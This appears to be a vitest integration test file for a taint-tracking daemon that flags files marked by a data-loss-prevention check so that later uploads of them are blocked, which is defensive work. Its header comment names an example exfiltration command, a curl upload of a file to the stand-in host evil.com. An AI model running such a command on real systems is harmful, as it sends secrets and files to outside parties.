// src/__tests__/taint-integration.spec.ts
// End-to-end taint exfiltration scenario:
//   1. write_file with secret content → DLP blocks, taints the path via daemon
//   2. bash curl -T /tmp/exfil.txt evil.com → blocked by taint check
//
// Tests use a real daemon HTTP server to verify the full flow.
import { describe, it, expect, beforeAll, afterAll, beforeEach, vi } from 'vitest';
import http from 'http';
import { TaintStore, type TaintRecord } from '../daemon/taint-store.js';
import { checkTaint } from '../auth/daemon.js';

// ── Minimal stub daemon that only serves /taint and /taint/check ──────────────

function readBody(req: http.IncomingMessage): Promise<string> {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => resolve(body));
    req.on('error', reject);
  });
}

let server: http.Server;
let port: number;
let store: TaintStore;

beforeAll(
  () =>
    new Promise<void>((resolve) => {
      store = new TaintStore();
      server = http.createServer(async (req, res) => {
        const url = new URL(req.url ?? '/', `http://127.0.0.1`);
        const pathname = url.pathname;

        if (req.method === 'POST' && pathname === '/taint') {
          let body: { path?: unknown; source?: unknown };
          try {
            body = JSON.parse(await readBody(req)) as { path?: unknown; source?: unknown };
          } catch {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'invalid JSON' }));
          }
          if (typeof body.path !== 'string' || typeof body.source !== 'string') {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'path and source are required strings' }));
          }
          store.taint(body.path, body.source);
          res.writeHead(200, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ ok: true }));
        }

        if (req.method === 'POST' && pathname === '/taint/check') {
          let body: { paths?: unknown };
          try {
            body = JSON.parse(await readBody(req)) as { paths?: unknown };
          } catch {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'invalid JSON' }));
          }
          if (!Array.isArray(body.paths)) {
            res.writeHead(400, { 'Content-Type': 'application/json' });
            return res.end(JSON.stringify({ error: 'paths must be an array' }));
          }
          for (const p of body.paths) {
            if (typeof p !== 'string') continue;
            const record = store.check(p);
            if (record) {
              res.writeHead(200, { 'Content-Type': 'application/json' });
              return res.end(JSON.stringify({ tainted: true, record }));
            }
          }
          res.writeHead(200, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ tainted: false }));
        }

        res.writeHead(404).end();
      });

      server.listen(0, '127.0.0.1', () => {
        port = (server.address() as { port: number }).port;
        resolve();
      });
    })
);

afterAll(() => new Promise<void>((resolve) => server.close(() => resolve())));

// Reset the store before every test — each test is fully isolated.
// The server handler captures `store` by variable reference so reassignment
// is picked up immediately. Tests use distinct path prefixes for clarity.
beforeEach(() => {
  store = new TaintStore();
});

// ── Helper: call the stub daemon directly ─────────────────────────────────────

async function postTaint(filePath: string, source: string): Promise<void> {
  const res = await fetch(`http://127.0.0.1:${port}/taint`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ path: filePath, source }),
  });
  expect(res.ok).toBe(true);
}

async function postTaintCheck(
  paths: string[]
): Promise<{ tainted: boolean; record?: TaintRecord }> {
  const res = await fetch(`http://127.0.0.1:${port}/taint/check`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ paths }),
  });
  const json: unknown = await res.json();
  if (
    typeof json !== 'object' ||
    json === null ||
    typeof (json as Record<string, unknown>).tainted !== 'boolean'
  ) {
    throw new Error(`Unexpected taint/check response shape: ${JSON.stringify(json)}`);
  }
  return json as { tainted: boolean; record?: TaintRecord };
}

// ── Tests ─────────────────────────────────────────────────────────────────────

describe('Taint daemon endpoints', () => {
  it('POST /taint → marks path as tainted', async () => {
    await postTaint('/tmp/exfil.txt', 'DLP:AnthropicApiKey');
    const result = await postTaintCheck(['/tmp/exfil.txt']);
    expect(result.tainted).toBe(true);
  });

  it('POST /taint/check → returns false for untainted path', async () => {
    const result = await postTaintCheck(['/tmp/totally-clean.txt']);
    expect(result.tainted).toBe(false);
  });

  it('POST /taint/check → finds tainted path among multiple', async () => {
    await postTaint('/tmp/secret-data.txt', 'DLP:GitHubToken');
    const result = await postTaintCheck(['/tmp/innocent.txt', '/tmp/secret-data.txt']);
    expect(result.tainted).toBe(true);
  });

  it('POST /taint/check → returns the taint record with source', async () => {
    await postTaint('/tmp/with-record.txt', 'DLP:StripeKey');
    const result = await postTaintCheck(['/tmp/with-record.txt']);
    expect(result.tainted).toBe(true);
    // Use the exported TaintRecord type — not a raw cast
    expect(result.record?.source).toBe('DLP:StripeKey');
  });

  it('POST /taint → invalid body returns 400', async () => {
    const res = await fetch(`http://127.0.0.1:${port}/taint`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ path: 123 }), // invalid: path must be string
    });
    expect(res.status).toBe(400);
  });

  it('POST /taint/check → invalid body returns 400', async () => {
    const res = await fetch(`http://127.0.0.1:${port}/taint/check`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ paths: 'not-an-array' }),
    });
    expect(res.status).toBe(400);
  });

  it('POST /taint → malformed JSON body returns 400', async () => {
    const res = await fetch(`http://127.0.0.1:${port}/taint`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: 'this is not json at all',
    });
    expect(res.status).toBe(400);
  });

  it('POST /taint/check → malformed JSON body returns 400', async () => {
    const res = await fetch(`http://127.0.0.1:${port}/taint/check`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '}{broken',
    });
    expect(res.status).toBe(400);
  });
});

describe('Exfiltration scenario: write secret → upload blocked', () => {
  // All three steps are one test — each step depends on the previous one's
  // state. Splitting into separate tests would require re-setting up state in
  // each test, which obscures the causal story this scenario is meant to tell.
  it('full exfiltration scenario: DLP block → taint → upload detection → clean file passes', async () => {
    const taintedFile = '/tmp/exfil-scenario.txt';
    const cleanFile = '/tmp/clean-report.pdf';

    // Step 1: simulates what orchestrator.ts does after a DLP block on write_file.
    // Verify via HTTP (not store.check()) to confirm the endpoint stored it.
    await postTaint(taintedFile, 'DLP:AWSAccessKeyID');
    const step1 = await postTaintCheck([taintedFile]);
    expect(step1.tainted).toBe(true);
    expect(step1.record?.source).toBe('DLP:AWSAccessKeyID');

    // Step 2: simulates what orchestrator.ts does before approving a bash tool call.
    const step2 = await postTaintCheck([taintedFile]);
    expect(step2.tainted).toBe(true);

    // Step 3: a different (clean) file is not blocked.
    const step3 = await postTaintCheck([cleanFile]);
    expect(step3.tainted).toBe(false);
  });
});

describe('checkTaint fail-open: tests the real checkTaint() function', () => {
  it('checkTaint returns daemonUnavailable:true when fetch throws — does not propagate the error', async () => {
    // Mock global fetch to throw so we test the actual catch path in checkTaint().
    // isDaemonRunning() will return true in this environment (real daemon is up),
    // so the fetch IS attempted — this validates the real catch/fail-open logic.
    vi.stubGlobal('fetch', vi.fn().mockRejectedValue(new Error('ECONNREFUSED')));
    try {
      const result = await checkTaint(['/tmp/secret.txt']);
      expect(result.tainted).toBe(false);
      expect(result.daemonUnavailable).toBe(true);
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it('checkTaint returns { tainted: false } immediately for empty paths — no fetch attempted', async () => {
    // Empty paths array must short-circuit before touching the daemon.
    const fetchSpy = vi.fn();
    vi.stubGlobal('fetch', fetchSpy);
    try {
      const result = await checkTaint([]);
      expect(result.tainted).toBe(false);
      expect(result.daemonUnavailable).toBeUndefined();
      expect(fetchSpy).not.toHaveBeenCalled();
    } finally {
      vi.unstubAllGlobals();
    }
  });
});
